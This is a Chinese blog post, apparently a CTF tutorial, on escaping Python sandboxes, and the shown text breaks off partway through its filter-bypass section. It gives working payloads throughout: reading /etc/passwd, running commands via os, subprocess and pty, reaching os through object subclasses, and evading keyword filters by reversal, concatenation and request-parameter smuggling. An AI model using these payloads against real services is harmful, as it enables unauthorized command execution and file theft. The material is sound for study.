@@ -1,0 +1,976 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="声明：本篇文章作者YDJA，本文属i春秋原创奖励计划，未经许可禁止转载。 0x00 前言文章内容比较基础，希望能给对python沙箱逃逸比较陌生的师傅们提供一点思路">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Python沙箱逃逸">
+<meta property="og:url" content="http://example.com/2023/11/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/index.html">
+<meta property="og:site_name" content="YDJ&#39;s_Bl0g">
+<meta property="og:description" content="声明：本篇文章作者YDJA，本文属i春秋原创奖励计划，未经许可禁止转载。 0x00 前言文章内容比较基础，希望能给对python沙箱逃逸比较陌生的师傅们提供一点思路">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2023/11/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/image-20231106050102272.png">
+<meta property="article:published_time" content="2023-11-05T20:58:18.000Z">
+<meta property="article:modified_time" content="2023-11-05T21:02:08.343Z">
+<meta property="article:author" content="YDJ">
+<meta property="article:tag" content="Python沙箱逃逸">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/11/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/image-20231106050102272.png">
+
+<link rel="canonical" href="http://example.com/2023/11/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Python沙箱逃逸 | YDJ's_Bl0g</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">YDJ's_Bl0g</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="YDJ">
+      <meta itemprop="description" content="我这一生，如履薄冰">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="YDJ's_Bl0g">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Python沙箱逃逸
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-11-06 04:58:18 / 修改时间：05:02:08" itemprop="dateCreated datePublished" datetime="2023-11-06T04:58:18+08:00">2023-11-06</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/WEB/" itemprop="url" rel="index"><span itemprop="name">WEB</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.5k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>8 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>声明：本篇文章作者YDJA，本文属i春秋原创奖励计划，未经许可禁止转载。</p>
+<p>0x00 前言<br>文章内容比较基础，希望能给对python沙箱逃逸比较陌生的师傅们提供一点思路</p>
+<span id="more"></span>
+
+<p>0x01 漏洞原理<br>沙箱逃逸，就是在给我们的一个代码执行环境下，脱离种种waf的过滤和限制，最终造成文件读写，命令执行等恶意操作<br>0x02 利用方式</p>
+<ol>
+<li>文件读写</li>
+</ol>
+<ul>
+<li>file<blockquote>
+<blockquote>
+<blockquote>
+<p>file(“&#x2F;etc&#x2F;passwd”).read()    #python2<br>‘root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash\ndaemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin\nbin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin\nsys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin\nsync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync\ngames:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin\nman:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin\nlp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin\nmail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin\nnews:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin\n ……’<br>file(“test1”,”w”).write(“Hello World!”)    #python2<br>file(“test1”).read()<br>‘Hello World!’</p>
+</blockquote>
+</blockquote>
+</blockquote>
+</li>
+<li>open<blockquote>
+<blockquote>
+<blockquote>
+<p>open(“&#x2F;etc&#x2F;passwd”).read()<br>‘root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash\ndaemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin\nbin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin\nsys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin\nsync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync\ngames:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin\nman:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin\nlp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin\nmail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin\nnews:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin\n ……’<br>open(“test2”,”w”).write(“Hello World!”)<br>open(“test2”).read()<br>‘Hello World!’</p>
+</blockquote>
+</blockquote>
+</blockquote>
+</li>
+</ul>
+<ol start="2">
+<li>基础命令执行</li>
+</ol>
+<ul>
+<li>system<blockquote>
+<blockquote>
+<blockquote>
+<p>import os<br>os.system(‘whoami’)<br>ydj</p>
+</blockquote>
+</blockquote>
+</blockquote>
+</li>
+<li>popen<blockquote>
+<blockquote>
+<blockquote>
+<p>import os<br>os.popen(“whoami”).read()<br>‘ydj\n’</p>
+</blockquote>
+</blockquote>
+</blockquote>
+</li>
+<li>eval<blockquote>
+<blockquote>
+<blockquote>
+<p>eval(‘<strong>import</strong>(“os”).system(“whoami”)’)<br>ydj</p>
+</blockquote>
+</blockquote>
+</blockquote>
+</li>
+<li>exec<blockquote>
+<blockquote>
+<blockquote>
+<p>exec(‘<strong>import</strong>(“os”).system(“whoami”)’)<br>ydj</p>
+</blockquote>
+</blockquote>
+</blockquote>
+</li>
+<li>sys<blockquote>
+<blockquote>
+<blockquote>
+<p>import sys<br>sys.modules[“os”].system(“whoami”)<br>ydj</p>
+</blockquote>
+</blockquote>
+</blockquote>
+</li>
+<li>pty<blockquote>
+<blockquote>
+<blockquote>
+<p>import pty<br>pty.spawn(“whoami”)<br>ydj<br>pty.spawn(“&#x2F;bin&#x2F;bash”)    #直接获取一个bash<br>┌──(ydj㉿LAPTOP-T0I7OJP0)-[~]<br>└─$ exit<br>exit</p>
+</blockquote>
+</blockquote>
+</blockquote>
+</li>
+<li>execfile<blockquote>
+<blockquote>
+<blockquote>
+<p>execfile(“&#x2F;usr&#x2F;lib&#x2F;python2.7&#x2F;os.py”)    #python2<br>system(“whoami”)<br>ydj</p>
+</blockquote>
+</blockquote>
+</blockquote>
+</li>
+<li>commands<blockquote>
+<blockquote>
+<blockquote>
+<p>import commands    #python2<br>commands.getstatusoutput(“whoami”)<br>(0, ‘ydj’)</p>
+</blockquote>
+</blockquote>
+</blockquote>
+</li>
+</ul>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>commands.getoutput(“whoami”)<br>‘ydj’</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<ul>
+<li>importlib（imp）<blockquote>
+<blockquote>
+<blockquote>
+<p>import importlib<br>importlib.import_module(“os”).system(“whoami”)<br>ydj</p>
+</blockquote>
+</blockquote>
+</blockquote>
+</li>
+</ul>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>importlib.<strong>import</strong>(“os”).system(“whoami”)<br>ydj</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<ul>
+<li>timeit<blockquote>
+<blockquote>
+<blockquote>
+<p>import timeit<br>timeit.timeit(“<strong>import</strong>(‘os’).system(‘whoami’)”,number&#x3D;1)<br>ydj</p>
+</blockquote>
+</blockquote>
+</blockquote>
+</li>
+<li>platform<blockquote>
+<blockquote>
+<blockquote>
+<p>import platform<br>platform.os.system(“whoami”)<br>ydj</p>
+</blockquote>
+</blockquote>
+</blockquote>
+</li>
+<li>pdb<blockquote>
+<blockquote>
+<blockquote>
+<p>import pdb<br>pdb.os.system(“whoami”)<br>ydj</p>
+</blockquote>
+</blockquote>
+</blockquote>
+</li>
+<li>subprocess<blockquote>
+<blockquote>
+<blockquote>
+<p>import subprocess<br>subprocess.call(“whoami”, shell&#x3D;True)<br>ydj</p>
+</blockquote>
+</blockquote>
+</blockquote>
+</li>
+</ul>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>subprocess.Popen(“whoami”, shell&#x3D;True)<br>&lt;Popen: returncode: None args: ‘whoami’&gt;<br>ydj</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<ul>
+<li>自建模块导入</li>
+</ul>
+<p>#hack.py<br>import os<br>os.system(“whoami”)</p>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>import hack<br>ydj<br>3. 通过继承关系逃逸（SSTI常考）<br>3.1 多重继承特性<br>与java等语言不同，python支持多重继承，这意味着一个子类可以拥有多个父类，这个特性是造成逃逸的关键，下面先来引入几个知识点（可以把他们理解为一个可以用 . 号调用的方法）</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<ul>
+<li><strong>class</strong> ：返回对象所属的类<blockquote>
+<blockquote>
+<blockquote>
+<p>‘’.<strong>class</strong><br>&lt;class ‘str’&gt;</p>
+</blockquote>
+</blockquote>
+</blockquote>
+</li>
+<li><strong>mro</strong> ：返回类的继承顺序<blockquote>
+<blockquote>
+<blockquote>
+<p>‘’.<strong>class</strong>.<strong>mro</strong><br>(&lt;class ‘str’&gt;, &lt;class ‘object’&gt;)</p>
+</blockquote>
+</blockquote>
+</blockquote>
+</li>
+<li><strong>base</strong> ：以字符串返回一个类所直接继承的类<blockquote>
+<blockquote>
+<blockquote>
+<p>‘’.<strong>class</strong>.<strong>base</strong><br>&lt;class ‘object’&gt;</p>
+</blockquote>
+</blockquote>
+</blockquote>
+</li>
+<li><strong>bases</strong> ：以元组的形式返回一个类所直接继承的类<blockquote>
+<blockquote>
+<blockquote>
+<p>‘’.<strong>class</strong>.<strong>bases</strong><br>(&lt;class ‘object’&gt;,)</p>
+</blockquote>
+</blockquote>
+</blockquote>
+</li>
+<li><strong>subclasses</strong>() ：获取类的所有子类<blockquote>
+<blockquote>
+<blockquote>
+<p>‘’.<strong>class</strong>.<strong>subclasses</strong>()<br>[&lt;enum ‘StrEnum’&gt;]</p>
+</blockquote>
+</blockquote>
+</blockquote>
+</li>
+</ul>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>‘’.<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()    #object类的所有子类<br>[&lt;class ‘type’&gt;, &lt;class ‘async_generator’&gt;, &lt;class ‘bytearray_iterator’&gt;, &lt;class ‘bytearray’&gt;, &lt;class ‘bytes_iterator’&gt;, &lt;class ‘bytes’&gt;, &lt;class ‘builtin_function_or_method’&gt;, &lt;class ‘callable_iterator’&gt;, &lt;class ‘PyCapsule’&gt;, &lt;class ‘cell’&gt;, &lt;class ‘classmethod_descriptor’&gt;, &lt;class ‘classmethod’&gt;, &lt;class ‘code’&gt;, &lt;class ‘complex’&gt;, &lt;class ‘_contextvars.Token’&gt;, ……]<br>在python2中可以直接利用file读写文件<br>[].<strong>class</strong>.<strong>bases</strong>[0].<strong>subclasses</strong>()[40]<br>&lt;type ‘file’&gt;</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>[].<strong>class</strong>.<strong>bases</strong>[0].<strong>subclasses</strong>()<a href="'/etc/passwd'">40</a>.read()<br>‘root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash\ndaemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin\nbin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin\nsys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin\nsync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync\ngames:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin\nman:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin\nlp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin\nmail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin\nnews:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin\n ……’</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<ul>
+<li><strong>init</strong> ：所有自带类都包含init方法，便于利用他当跳板来调用globals</li>
+<li><strong>globals</strong> ：配合__init__获取函数所处空间下可使用的module、方法以及所有变量<blockquote>
+<blockquote>
+<blockquote>
+<p>‘’.<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()[192].<strong>init</strong>.<strong>globals</strong><br>{‘<strong>name</strong>‘: ‘contextlib’, ‘<strong>doc</strong>‘: ‘Utilities for with-statement contexts.  See PEP 343.’, ‘<strong>package</strong>‘: ‘’, ‘<strong>loader</strong>‘: &lt;_frozen_importlib_external.SourceFileLoader object at 0x7f5bbb592a10&gt;, ‘<strong>spec</strong>‘: ModuleSpec(name&#x3D;’contextlib’, loader&#x3D;&lt;_frozen_importlib_external.SourceFileLoader object at 0x7f5bbb592a10&gt;, ……}</p>
+</blockquote>
+</blockquote>
+</blockquote>
+</li>
+</ul>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>‘’.<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()[192].<strong>init</strong>.<strong>globals</strong>[“os”]<br>&lt;module ‘os’ (frozen)&gt;</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<ul>
+<li><strong>dict</strong> ：用来存储对象属性的一个字典，其键为属性名，值为属性的值<blockquote>
+<blockquote>
+<blockquote>
+<p>‘’.<strong>class</strong>.<strong>dict</strong><br>mappingproxy({‘<strong>new</strong>‘: &lt;built-in method __new__ of type object at 0x958980&gt;, ‘<strong>repr</strong>‘: &lt;slot wrapper ‘__repr__’ of ‘str’ objects&gt;, ‘<strong>hash</strong>‘: &lt;slot wrapper ‘__hash__’ of ‘str’ objects&gt;, ‘<strong>str</strong>‘: &lt;slot wrapper ‘__str__’ of ‘str’ objects&gt;, ‘<strong>getattribute</strong>‘: &lt;slot wrapper ‘__getattribute__’ of ‘str’ objects&gt;, ‘<strong>lt</strong>‘: &lt;slot wrapper ‘__lt__’ of ‘str’ objects&gt;, ‘<strong>le</strong>‘: &lt;slot wrapper ‘__le__’ of ‘str’ objects&gt;, ……})</p>
+</blockquote>
+</blockquote>
+</blockquote>
+</li>
+</ul>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>‘’.<strong>class</strong>.<strong>dict</strong>[‘<strong>str</strong>‘]<br>&lt;slot wrapper ‘__str__’ of ‘str’ objects&gt;</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<ul>
+<li>__builtin__、builtins、__builtins__：python内建模块，内含不需要import导入就能使用的函数。在2.x中，为__builtin__，在3.x中，则为builtins，而__builtins__为两者都有的模块，前两者需要import，后者不用<blockquote>
+<blockquote>
+<blockquote>
+<p>import <strong>builtin</strong>    #python2<br>dir(<strong>builtin</strong>)<br>[‘ArithmeticError’, ‘AssertionError’, ‘AttributeError’, ‘BaseException’, ‘BufferError’, ‘BytesWarning’, ‘DeprecationWarning’, ‘EOFError’, ‘Ellipsis’, ‘EnvironmentError’, ‘Exception’, ‘False’, ‘FloatingPointError’, ‘FutureWarning’, ‘GeneratorExit’, ‘IOError’, ‘ImportError’, ‘ImportWarning’, ‘IndentationError’, ‘IndexError’, ‘KeyError’, ‘KeyboardInterrupt’, ‘LookupError’, ‘MemoryError’, ……]<br>import builtins    #python3<br>dir(builtins)<br>[‘ArithmeticError’, ‘AssertionError’, ‘AttributeError’, ‘BaseException’, ‘BaseExceptionGroup’, ‘BlockingIOError’, ‘BrokenPipeError’, ‘BufferError’, ‘BytesWarning’, ‘ChildProcessError’, ‘ConnectionAbortedError’, ‘ConnectionError’, ‘ConnectionRefusedError’, ‘ConnectionResetError’, ‘DeprecationWarning’, ‘EOFError’, ‘Ellipsis’, ‘EncodingWarning’, ‘EnvironmentError’, ‘Exception’, ‘ExceptionGroup’, ……]<br>dir(<strong>builtins</strong>)    #both<br>[‘ArithmeticError’, ‘AssertionError’, ‘AttributeError’, ‘BaseException’, ‘BaseExceptionGroup’, ‘BlockingIOError’, ‘BrokenPipeError’, ‘BufferError’, ‘BytesWarning’, ‘ChildProcessError’, ‘ConnectionAbortedError’, ‘ConnectionError’, ‘ConnectionRefusedError’, ‘ConnectionResetError’, ‘DeprecationWarning’, ‘EOFError’, ‘Ellipsis’, ‘EncodingWarning’, ‘EnvironmentError’, ‘Exception’, ‘ExceptionGroup’, ……]<br>可以通过内建模块配合__dict__进行文件读写和命令执行<br><strong>builtins</strong>.<strong>dict</strong><a href="%22/etc/passwd%22">“open”</a>.read()<br>‘root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash\ndaemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin\nbin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin\nsys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin\nsync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync\ngames:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin\nman:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin\nlp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin\nmail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin\nnews:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin\n ……’</p>
+</blockquote>
+</blockquote>
+</blockquote>
+</li>
+</ul>
+<blockquote>
+<blockquote>
+<blockquote>
+<p><strong>builtins</strong>.<strong>dict</strong><a href="'os'">‘<strong>import</strong>‘</a>.system(‘whoami’)<br>ydj<br>3.2 整体逃逸思路<br>结合以上知识点，我们已经可以进行一个基础的逃逸攻击（此处演示用的python3.11）</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<ul>
+<li>先通过__class__获取一个类，什么类型都可以，因为我们目的是为了获取object基类，而python中所有类都继承于object基类<blockquote>
+<blockquote>
+<blockquote>
+<p>‘’.<strong>class</strong><br>&lt;class ‘str’&gt;</p>
+</blockquote>
+</blockquote>
+</blockquote>
+</li>
+</ul>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>[].<strong>class</strong><br>&lt;class ‘list’&gt;</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<ul>
+<li>然后通过bases或者mro来获取到object基类<blockquote>
+<blockquote>
+<blockquote>
+<p>‘’.<strong>class</strong>.<strong>base</strong><br>&lt;class ‘object’&gt;</p>
+</blockquote>
+</blockquote>
+</blockquote>
+</li>
+</ul>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>‘’.<strong>class</strong>.<strong>mro</strong>[1]<br>&lt;class ‘object’&gt;</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<ul>
+<li><p>然后获取object的子类</p>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>‘’.<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()<br>[&lt;class ‘type’&gt;, &lt;class ‘async_generator’&gt;, &lt;class ‘bytearray_iterator’&gt;, &lt;class ‘bytearray’&gt;, &lt;class ‘bytes_iterator’&gt;, &lt;class ‘bytes’&gt;, &lt;class ‘builtin_function_or_method’&gt;, &lt;class ‘callable_iterator’&gt;, &lt;class ‘PyCapsule’&gt;, &lt;class ‘cell’&gt;, &lt;class ‘classmethod_descriptor’&gt;, &lt;class ‘classmethod’&gt;, &lt;class ‘code’&gt;, &lt;class ‘complex’&gt;, &lt;class ‘_contextvars.Token’&gt;, ……]</p>
+</blockquote>
+</blockquote>
+</blockquote>
+</li>
+<li><p>然后利用__init__.__globals__爆破有可以利用的类（比如有file函数，os模块等可以文件读写和命令执行的类）<br>做题的时候用burp爆破比较方便，由于我这里是本地演示的，没有题目环境，就写个脚本爆吧<br>#burp.py<br>for i in range(0,300):<br>  try:<br>  j&#x3D;eval(f”[].<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()[{i}].<strong>init</strong>.<strong>globals</strong>“)<br>  if ‘os’ in j:<br>      print(i)<br>  except Exception:    #运行过程会产生报错，pass就好了<br>  pass<br><img src="/2023/11/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/image-20231106050102272.png" alt="image-20231106050102272"></p>
+</li>
+<li><p>最终payload</p>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>[].<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()[144].<strong>init</strong>.<strong>globals</strong>[“os”].system(‘whoami’)<br>ydj<br>0x03 waf绕过姿势<br>这里我不针对单一的防护进行绕过，因为在CTF中的waf往往都是要结合多种姿势才能绕过，所以我会尽可能多的总结出各种姿势，到时候遇到waf就可以从这里面灵活的结合各种方法进行绕过。</p>
+</blockquote>
+</blockquote>
+</blockquote>
+</li>
+</ul>
+<ol>
+<li>双写<br>这个大家应该都知道吧</li>
+<li>逆转<blockquote>
+<blockquote>
+<blockquote>
+<p><strong>import</strong>(‘so’[::-1]).system(‘whoami’)<br>ydj</p>
+</blockquote>
+</blockquote>
+</blockquote>
+</li>
+<li>拼接<blockquote>
+<blockquote>
+<blockquote>
+<p><strong>import</strong>(‘o’+’s’).system(‘whoami’)<br>ydj</p>
+</blockquote>
+</blockquote>
+</blockquote>
+</li>
+</ol>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>a&#x3D;’o’<br>b&#x3D;’s’<br><strong>import</strong>(a+b).system(‘whoami’)<br>ydj</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<ul>
+<li>如果有实际环境可以利用request.args（flask中一个存储着请求参数以及其值的字典）绕过引号<br>?payload&#x3D;[].<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()[144].<strong>init</strong>.<strong>globals</strong>[request.args.a].system(request.args.b)&amp;a&#x3D;os&amp;b&#x3D;whoami</li>
+</ul>
+<ol start="4">
+<li>逆转结合eval、exec<blockquote>
+<blockquote>
+<blockquote>
+<p>exec(‘)”imaohw”(metsys.so ;so tropmi’[::-1])<br>ydj</p>
+</blockquote>
+</blockquote>
+</blockquote>
+</li>
+</ol>
+<ul>
